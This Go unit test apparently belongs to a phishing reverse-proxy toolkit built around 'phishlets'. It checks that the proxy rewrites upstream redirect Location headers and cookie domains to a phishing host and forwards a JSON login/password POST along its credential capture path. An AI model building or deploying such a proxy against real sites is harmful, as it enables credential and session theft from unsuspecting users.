package proxy

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/core/session"
)

func TestRedirectCookieJSON(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/redir" {
			w.Header().Set("Location", "https://origin.upstream.test/next")
			w.Header().Add("Set-Cookie", "s=1; Domain=upstream.test; Path=/")
			w.WriteHeader(http.StatusFound)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"ok":true}`)
	}))
	defer upstream.Close()

	st := phishlet.NewStore()
	if err := st.LoadDir("../../configs/phishlets"); err != nil {
		t.Fatal(err)
	}
	eng := New(st, session.NewMemory(0), nil)
	eng.SetUpstream(map[string]string{"origin.upstream.test": upstream.URL})

	ua := func(r *http.Request) {
		r.Header.Set("User-Agent", "Mozilla/5.0 Chrome/126")
		r.Header.Set("Accept-Language", "en-US")
		r.Header.Set("Accept", "*/*")
	}
	// redirect rewrite (client без follow)
	req := httptest.NewRequest(http.MethodGet, "http://login.phish.test/redir", nil)
	ua(req)
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	if loc := rec.Result().Header.Get("Location"); !strings.Contains(loc, "login.phish.test") {
		t.Fatalf("location not rewritten: %q", loc)
	}
	if sc := rec.Result().Header.Get("Set-Cookie"); strings.Contains(sc, "upstream.test") {
		t.Fatalf("cookie domain not rewritten: %q", sc)
	}
	// JSON POST capture path (без bus — проверяем только форвард 200)
	req2 := httptest.NewRequest(http.MethodPost, "http://login.phish.test/api",
		strings.NewReader(`{"login":"a","passwd":"secret"}`))
	req2.Header.Set("Content-Type", "application/json")
	ua(req2)
	rec2 := httptest.NewRecorder()
	eng.ServeHTTP(rec2, req2)
	if rec2.Code != 200 {
		t.Fatalf("json post: %d", rec2.Code)
	}
}
